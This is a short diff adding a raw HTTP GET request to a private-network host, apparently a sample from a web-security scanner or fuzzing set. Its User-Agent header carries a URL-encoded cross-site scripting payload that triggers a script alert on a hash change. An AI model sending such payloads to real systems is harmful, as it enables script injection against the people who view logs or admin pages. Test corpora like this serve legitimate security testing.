@@ -1,0 +1,7 @@
+GET / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: %3Cbody%20onhashchange%3Dalert%281%29%3E%3Ca%20href%3D%2523x%3Eclick%20this%21%23x
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
